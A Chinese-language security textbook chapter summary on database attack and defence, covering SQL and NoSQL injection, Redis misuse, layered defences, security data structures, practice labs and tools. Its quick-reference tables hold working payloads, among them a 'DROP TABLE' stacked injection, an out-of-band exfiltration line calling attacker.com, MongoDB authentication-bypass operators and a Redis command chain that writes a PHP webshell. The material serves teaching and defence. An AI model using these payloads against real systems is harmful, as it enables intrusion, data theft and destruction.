# 第11章 数据库与数据结构——本章小结

本章从数据库安全的理论根基出发，经由注入技术的系统化拆解，贯穿实战案例的完整攻防链路，最终落脚于防御体系的建设与数据结构的安全应用。本小结将从知识体系总览、核心能力提炼、技术要点速查、攻防思维升华四个维度，帮助读者将零散知识点编织成完整的认知网络。

---

## 一、知识体系总览

### 1.1 本章内容全景图

```mermaid
graph TD
    A[第11章 数据库与数据结构] --> B[理论基础]
    A --> C[核心技巧]
    A --> D[实战案例]
    A --> E[常见误区]
    A --> F[练习方法]
    A --> G[深度拓展]

    B --> B1[关系型数据库基础]
    B --> B2[NoSQL数据库基础]
    B --> B3[数据结构安全应用]
    B --> B4[SQL注入原理]
    B --> B5[安全配置基线]

    C --> C1[联合查询注入]
    C --> C2[报错注入]
    C --> C3[盲注技术]
    C --> C4[堆叠注入]
    C --> C5[NoSQL注入]
    C --> C6[二次注入]
    C --> C7[注入防御]
    C --> C8[安全审计工具]

    D --> D1[联合查询获取管理员密码]
    D --> D2[时间盲注提取数据库]
    D --> D3[MongoDB注入绕过认证]
    D --> D4[Redis未授权访问拿服务器]
    D --> D5[二次注入修改管理员密码]
    D --> D6[MongoDB未授权数据泄露]
    D --> D7[Redis写入WebShell]

    E --> E1[存储过程绝对安全?]
    E --> E2[只防SELECT注入?]
    E --> E3[依赖黑名单?]
    E --> E4[暴露错误信息?]
    E --> E5[NoSQL不需要安全?]
    E --> E6[弱密码/默认密码?]
    E --> E7[备份不加密?]
    E --> E8[不监控不更新?]

    G --> G1[二阶注入]
    G --> G2[带外数据外带]
    G --> G3[WAF绕过技术]
    G --> G4[数据库提权]
    G --> G5[ORM注入]
    G --> G6[云数据库安全]
```



### 1.2 各部分之间的逻辑关系

本章的设计遵循"道法术器"的递进逻辑：

| 层次 | 对应内容 | 核心问题 |
|------|---------|---------|
| **道（原理）** | 理论基础部分 | 为什么数据库是安全攻防的核心战场？ |
| **法（方法）** | 核心技巧部分 | 有哪些系统化的注入方法和防御策略？ |
| **术（实操）** | 实战案例部分 | 在真实场景中如何完整走通攻击链？ |
| **器（工具）** | 审计工具 + 练习方法 | 用什么工具提高效率？如何系统训练？ |

理论基础为技巧学习提供"为什么"，核心技巧为实战案例提供"怎么做"，实战案例反过来验证理论理解是否到位，常见误区则是对整个学习过程的纠偏——每一部分都不是孤立存在的。

---

## 二、核心能力提炼

### 2.1 必须掌握的六大能力域

学完本章后，你应该具备以下六个维度的能力。这不是"了解即可"的清单，而是"能在实战中运用"的标准：

**能力域一：SQL注入的识别与利用**

理解注入的本质——用户输入被当作SQL代码执行——并能根据目标环境选择合适的注入方式。具体包括：能通过单引号探测、逻辑判断、ORDER BY等手法快速确认注入点和列数；能在联合查询、报错注入、布尔盲注、时间盲注之间灵活切换；能使用sqlmap等工具进行自动化测试并解读其输出。

**能力域二：NoSQL数据库的攻防**

认识到NoSQL数据库并非"天然安全"。MongoDB的操作符注入（`{"$gt": ""}`）、Redis的未授权访问和命令注入，都是现实中频繁出现的攻击面。能针对这两种数据库设计攻击方案并配置安全基线，是本章的基本要求。

**能力域三：数据库提权与后渗透**

从Web应用的数据库连接权限出发，通过`LOAD_FILE`读取敏感文件、通过`INTO OUTFILE`写入WebShell、通过`sys_exec`或`xp_cmdshell`执行系统命令，最终实现从"数据库用户"到"操作系统权限"的跨越。这条攻击链是渗透测试中从Web打点到内网横移的关键路径。

**能力域四：注入防御体系的建设**

不仅能写出参数化查询，更能从架构层面理解防御的层次：输入验证（白名单）是第一道防线，参数化查询是根本保障，WAF是辅助屏障，最小权限是最后兜底，审计日志是事后追溯的依据。五层防御缺一不可，但参数化查询的优先级最高。

**能力域五：数据结构的安全应用**

理解哈希表在会话管理和速率限制中的角色、前缀树在恶意域名检测中的效率优势、图结构在攻击路径分析和权限提升审计中的价值。这些知识不直接用于"攻击"，但能帮助你理解安全工具的底层逻辑，从而更好地选择和使用它们。

**能力域六：安全思维与工程素养**

攻防并重的思维方式——既要会攻击，也要会防御；自动化思维——把重复的手工测试过程脚本化；纵深防御思维——不依赖单一机制；持续更新思维——关注新的注入技术和绕过方法。

### 2.2 能力自检清单

以下问题用于自测对本章内容的掌握程度。如果无法回答其中任何一个，建议回溯对应章节重新学习：

- [ ] SQL注入的本质是什么？需要满足哪三个条件？
- [ ] 联合查询注入的完整步骤是什么？为什么第一步要用负数ID？
- [ ] `extractvalue()`和`updatexml()`报错注入的原理差异是什么？它们各自能返回多少字符？
- [ ] 布尔盲注和时间盲注分别适用于什么场景？各自的时间复杂度是多少？
- [ ] 堆叠注入和联合查询注入的本质区别是什么？为什么堆叠注入更危险？
- [ ] 二次注入为什么能绕过参数化查询？防御的关键在哪里？
- [ ] MongoDB的`$gt`、`$ne`、`$regex`操作符分别如何用于注入攻击？
- [ ] Redis未授权访问的完整攻击链是什么？从探测到RCE需要几步？
- [ ] 参数化查询为什么能从根本上防止SQL注入？它的实现原理是什么？
- [ ] WAF的黑名单过滤有哪些已知绕过方法？至少列出五种。
- [ ] 数据库备份文件泄露会造成什么后果？如何安全地管理备份？
- [ ] 前缀树（Trie）在安全领域的典型应用是什么？相比哈希表有什么优势？

---

## 三、技术要点速查

### 3.1 SQL注入技术矩阵

| 注入类型 | 原理 | 适用场景 | 关键Payload | 数据回显方式 |
|---------|------|---------|------------|-------------|
| **联合查询注入** | UNION SELECT拼接查询 | 页面有数据回显 | `' UNION SELECT 1,2,3--` | 页面直接显示 |
| **extractvalue报错** | XPath语法错误泄露数据 | 无回显但有报错信息 | `extractvalue(1,concat(0x7e,(SELECT ...),0x7e))` | 错误信息中 |
| **updatexml报错** | XML更新函数报错泄露 | 无回显但有报错信息 | `updatexml(1,concat(0x7e,(SELECT ...),0x7e),1)` | 错误信息中 |
| **floor报错** | COUNT+GROUP BY+RAND碰撞 | 无回显但有报错信息 | `(SELECT 1 FROM (SELECT COUNT(*),CONCAT(...,FLOOR(RAND(0)*2))x FROM ... GROUP BY x)a)` | 错误信息中 |
| **布尔盲注** | 页面内容的真/假差异 | 无回显无报错 | `' AND SUBSTR(database(),1,1)='a'--` | 页面差异 |
| **时间盲注** | 响应延迟判断真假 | 完全无回显 | `' AND IF(SUBSTR(database(),1,1)='a',SLEEP(5),0)--` | 响应时间 |
| **堆叠注入** | 分号分隔执行多条SQL | 支持多语句执行的驱动 | `'; DROP TABLE users;--` | 依赖第二条语句 |
| **二次注入** | 存储后在其他查询中触发 | 有数据存储再读取的流程 | 注册时写入`admin'--` | 间接效果 |
| **带外注入** | DNS/HTTP请求外带数据 | 无任何直接回显 | `LOAD_FILE(CONCAT('\\\\',...,attacker.com\\x'))` | 外部服务器 |

### 3.2 报错注入函数对比

| 函数 | MySQL版本 | 报错长度限制 | 原理 |
|------|----------|------------|------|
| `extractvalue()` | 5.1+ | 约32字符 | XPath表达式语法错误 |
| `updatexml()` | 5.1+ | 约32字符 | XPath表达式语法错误 |
| `floor()` + `GROUP BY` | 5.x | 无明确限制 | 主键重复错误 |
| `exp()` | 5.5+ | 约773字符 | 数值溢出错误 |

> **实战技巧**：`extractvalue()`和`updatexml()`都只能显示约32个字符，实际使用时配合`SUBSTR()`分段提取。`floor()`报错没有长度限制但payload较复杂，适合提取较长的数据。

### 3.3 NoSQL注入速查

**MongoDB操作符注入：**

```javascript
// 认证绕过
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// 条件注入
{"username": {"$regex": "^admin"}}
{"$where": "this.password.length > 0"}  // JavaScript注入

// 聚合管道注入
[{"$match": {"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}}]
```

**Redis未授权利用链：**

```bash
# 完整攻击链
redis-cli -h <target>              # 1. 探测未授权访问
CONFIG SET dir /var/www/html       # 2. 设置写入目录
CONFIG SET dbfilename shell.php    # 3. 设置文件名
SET x "<?php system($_GET['c']);?>" # 4. 写入WebShell
SAVE                               # 5. 保存到磁盘
# 替代方案：写入SSH公钥（crontab反弹shell）
```

### 3.4 防御技术优先级

```text
防御优先级（从高到低）：

1. 参数化查询 / 预编译语句        ← 根本防御，所有SQL操作必须使用
   ├── PreparedStatement (Java)
   ├── cursor.execute(sql, params) (Python)
   ├── PDO::prepare (PHP)
   └── pg_query_params (PostgreSQL)

2. 输入验证（白名单）              ← 额外防御层
   ├── 类型校验：数字就用int转换
   ├── 长度限制：截断超长输入
   ├── 格式校验：正则匹配合法模式
   └── 编码规范化：统一字符编码

3. 最小权限原则                    ← 减小攻击影响
   ├── 应用账户只授予必要权限
   ├── 禁用FILE权限（防读写文件）
   ├── 禁用SUPER权限（防系统命令）
   └── 限制数据库访问IP范围

4. WAF（Web应用防火墙）            ← 辅助防御
   ├── SQL注入特征检测
   ├── 异常流量识别
   └── 注意：可被绕过，不能单独依赖

5. 审计与监控                      ← 事后追溯
   ├── 数据库审计日志
   ├── 异常查询告警
   └── 登录失败监控
```

---

## 四、关键误区的深层反思

本章"常见误区"部分列出了十大常见错误认知。这里从更深层次总结这些误区的共同根源，帮助读者建立正确的安全思维模式：

### 4.1 误区的共同模式

所有误区都源于三种错误的思维模式：

**线性思维**：认为"做了X就安全了"。实际上安全是多层防御的结果，任何单一措施都可能被绕过。存储过程不能防注入（因为内部可能有动态SQL），黑名单不能防注入（因为编码和变形手段太多），WAF不能替代参数化查询（因为绕过技术持续进化）。

**静态思维**：认为"现在安全就永远安全"。数据库软件需要持续更新，密码需要定期更换，权限需要定期审计，配置需要随版本迭代而调整。安全是一个持续的过程，不是一个一次性的状态。

**局部思维**：认为"防住了SELECT就安全了"。INSERT、UPDATE、DELETE同样可以被注入；数据库本身安全了，备份文件可能泄露；数据库配置好了，连接字符串可能硬编码在源码中。攻击者总在寻找你忽略的那个角落。

### 4.2 从误区中提炼的三条核心原则

| 原则 | 含义 | 实践指导 |
|------|------|---------|
| **数据与代码分离** | 用户输入永远不能被当作代码执行 | 参数化查询是实现这一原则的工程手段 |
| **纵深防御** | 不依赖单一安全机制 | 参数化 + 验证 + WAF + 权限 + 审计，层层叠加 |
| **最小权限** | 只授予完成任务所需的最低权限 | 应用账户不需要DROP、FILE、SUPER等权限 |

---

## 五、数据结构安全应用回顾

本章的一个独特亮点是将数据结构知识与安全场景结合。这不是"凑内容"，而是因为理解底层数据结构能帮助安全从业者做出更好的工具选择和架构决策：

### 5.1 数据结构→安全应用映射

| 数据结构 | 安全应用 | 为什么适合 | 典型工具/场景 |
|---------|---------|-----------|-------------|
| **哈希表** | 会话管理、速率限制、密码存储 | O(1)查找，适合高频读写 | Redis会话存储、登录限流 |
| **布隆过滤器** | 恶意URL检测、密码泄露检查 | 空间效率极高，允许假阳性 | Have I Been Pwned、URL黑名单 |
| **前缀树（Trie）** | 恶意域名检测、敏感词过滤 | 前缀匹配O(m)，m为字符串长度 | DNS黑名单过滤、内容审核 |
| **Merkle树** | 数据完整性验证 | 局部校验不需要全部数据 | Git、区块链、证书透明度 |
| **B+树** | 数据库索引 | 磁盘IO优化，范围查询高效 | MySQL InnoDB索引 |
| **图结构** | 攻击路径分析、权限审计 | 表达实体间复杂关系 | BloodHound权限分析、网络拓扑 |

### 5.2 哈希碰撞攻击的启示

PHP HashDoS漏洞（CVE-2011-4885）是一个经典案例：攻击者构造大量哈希值相同的键值对提交给PHP的关联数组（底层是哈希表），导致哈希表退化为链表，查找复杂度从O(1)变为O(n)，服务器CPU被耗尽。这个案例说明：数据结构的理论复杂度分析不是纸上谈兵，在特定攻击条件下，"平均O(1)"可能变成"最坏O(n)"。

---

## 六、从本章到实战：能力迁移路径

### 6.1 CTF与靶场练习路线

掌握本章知识后，建议按以下路线进行实战训练：

```text
入门练习（1-2周）
├── SQLi-labs Less-1 ~ Less-10    ← 手动注入基础
├── DVWA SQL Injection (Low/Medium/High)  ← 不同难度
└── Hack The Box - Easy难度数据库相关题目

进阶练习（2-4周）
├── SQLi-labs Less-11 ~ Less-20   ← POST型、Cookie注入
├── SQLi-labs Less-21 ~ Less-40   ← 绕过WAF、过滤
├── PortSwigger SQL Injection Labs  ← 系统化学习
└── TryHackMe - SQL Injection模块

高级练习（持续）
├── 真实CVE漏洞复现（如CVE-2024-27956 WordPress注入）
├── 企业SRC中的数据库漏洞挖掘
├── 自研自动化注入框架
└── 数据库提权与后渗透链路
```

### 6.2 学习成果的行业映射

| 本章能力 | 对应的行业认证 | 对应的岗位技能 |
|---------|--------------|--------------|
| SQL注入利用 | OSCP、CEH | 渗透测试工程师 |
| 数据库安全加固 | CISP、CISSP | 安全运维工程师 |
| 安全审计工具 | CISA | 安全审计师 |
| 自动化脚本开发 | - | 安全研发工程师 |
| 代码审计 | - | 应用安全工程师 |

---

## 七、下一步学习方向

完成本章后，数据库安全的知识框架已经搭建完毕。以下是推荐的后续学习路径，按优先级排列：

### 7.1 近期必修（建议1-2个月内完成）

**第14章 Web安全（OWASP Top 10）**：SQL注入只是OWASP Top 10中的一种漏洞。系统学习XSS、CSRF、SSRF、文件上传、反序列化等漏洞类型，建立完整的Web安全知识体系。数据库注入是Web安全的一个子集，完整学习OWASP能让你看到更大的图景。

**第15章 网络渗透测试**：学习从信息收集到漏洞利用到后渗透的完整流程。数据库注入往往是渗透测试中的一个环节，理解完整的渗透方法论能让你更好地定位注入技术在整个攻击链中的位置。

### 7.2 中期拓展（建议3-6个月内完成）

**第12章 云计算基础**：云环境下的数据库安全有其特殊性——RDS的IAM认证、云数据库的网络隔离策略、Serverless数据库的安全模型，都与传统数据库有所不同。随着越来越多的企业上云，云数据库安全将成为必备技能。

**第17章 逆向工程**：理解数据库客户端的通信协议和认证机制，能帮助你发现协议层面的漏洞。例如MySQL的认证协议曾被发现存在离线密码破解的风险，这需要对协议实现有一定了解。

### 7.3 长期深耕方向

- **漏洞研究**：深入研究数据库软件本身的漏洞（CVE级别），如MySQL提权漏洞、PostgreSQL认证绕过等
- **安全工具开发**：开发更智能的SQL注入检测工具，集成机器学习进行异常查询识别
- **红队能力**：将数据库攻防融入完整的红队演练流程，从外网打点到内网数据库提权

---

## 八、推荐工具速查表

| 工具 | 类型 | 用途 | 安装/获取 |
|------|------|------|----------|
| **sqlmap** | SQL注入自动化 | 自动检测和利用SQL注入漏洞 | `pip install sqlmap` |
| **NoSQLMap** | NoSQL注入自动化 | MongoDB、CouchDB注入测试 | `pip install nosqlmap` |
| **Burp Suite** | Web安全测试平台 | 拦截请求、修改参数、自动化扫描 | https://portswigger.net |
| **SQLi-labs** | 练习靶场 | 75个SQL注入练习关卡 | `git clone https://github.com/Audi-1/sqli-labs` |
| **DVWA** | 综合Web靶场 | 包含SQL注入、XSS等多种漏洞 | `git clone https://github.com/digininja/DVWA` |
| **Hydra** | 暴力破解 | 数据库账户密码爆破 | `apt install hydra` |
| **Medusa** | 暴力破解 | 并行网络认证破解 | `apt install medusa` |
| **Metasploit** | 渗透框架 | 包含数据库利用模块 | `apt install metasploit-framework` |
| **DBeaver** | 数据库管理 | 多数据库统一管理客户端 | https://dbeaver.io |
| ** ghauri** | SQL注入 | sqlmap的替代工具，某些场景更优 | `pip install ghauri` |

---

## 九、核心名言与行动指南

> **"SQL注入虽然古老，但依然是最危险的Web漏洞之一。"**

很多人认为SQL注入已经过时了，但它仍然频繁出现在CVE报告和实际攻击中。根据OWASP 2021 Top 10，注入类漏洞（包括SQL注入）排名第三。根据Verizon 2024 DBIR报告，Web应用攻击中注入类漏洞仍占约20%。掌握SQL注入不仅是学习一个漏洞类型，更是理解"输入验证"和"数据与代码分离"这两个安全核心概念的最佳切入点。

**五条行动建议：**

1. **先理解原理，再学工具**：手动注入比sqlmap更重要。只有理解了注入的原理，才能在工具失败时手动构造payload，才能在新环境中快速适应。
2. **多种数据库都要学**：MySQL、PostgreSQL、MSSQL、MongoDB、Redis——每种数据库的语法、函数、安全模型都有差异。攻击者不会只面对MySQL。
3. **攻防并重**：既要会攻击，也要会防御。理解防御机制能帮助你更好地绕过它；理解攻击手法能帮助你更好地防御它。
4. **自动化思维**：把重复的注入过程脚本化。手动测试一次就够了，之后应该写脚本批量执行。这不仅提高效率，也是安全工程师的基本素养。
5. **持续更新**：关注新的注入技术和绕过方法。WAF在进化，数据库在更新，攻击技术也在演变。订阅安全博客、关注CVE公告、参与安全社区，保持知识的新鲜度。

---

***
